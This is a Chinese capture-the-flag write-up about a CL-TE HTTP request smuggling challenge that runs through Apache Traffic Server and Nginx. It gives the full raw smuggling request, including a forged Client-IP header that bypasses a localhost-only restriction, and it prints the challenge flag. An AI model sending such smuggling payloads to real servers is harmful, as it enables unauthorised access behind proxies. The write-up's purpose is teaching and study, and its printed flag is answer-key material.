# 走私者的愤怒

## 题目简述

本题延续 CL-TE 请求走私，但在 Apache Traffic Server 7.1.2 与最终 LNMP 服务之间增加了一层 Nginx。走私请求需要穿过两层代理，并以合法请求体结束内层 `POST /secret`，同时伪造本地来源头。

## 解题过程

请求链可概括为：客户端先连接 ATS，ATS 将流量交给 Nginx，Nginx 再转发给最终应用。仍利用前后端对 CL/TE 边界的不同理解，在零长度分块后放入第二条 HTTP 请求：

```http
POST / HTTP/1.1
Host: hrs.localhost
Content-Length: 100
Transfer-Encoding: chunked

0

POST /secret HTTP/1.1
Host: hrs.localhost
Client-IP: 127.0.0.1
Content-Length: 20

233
```

与前一题相比，内层请求改为 `POST` 并带请求体，使它经过 Nginx 后仍能满足后端路由的解析要求。`Client-IP` 继续用于绕过本地访问限制。上述长度来自官方请求样例；若修改主机名、请求体或换行，必须按实际发送字节重新计算两个 `Content-Length`。

服务端最终返回：

```text
hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!}
```

官方 PDF 没有保存该返回值，结果由 [Zry.IO 的同期复盘](https://zry.io/zh/cybersec/ctf/hgame2021-week-1-writeup/) 补齐；多层代理下的报文差异已在正文中说明。

## 方法总结

增加一层代理并不意味着同一走私报文仍然有效。多层代理链中，每一层都可能重写方法、长度字段或连接状态，因此要逐层判断其边界解析方式。遇到 CL-TE 变体时，除了构造外层解析差异，还要让被走私的内层请求本身在下一层看来是完整、合法的 HTTP 请求。
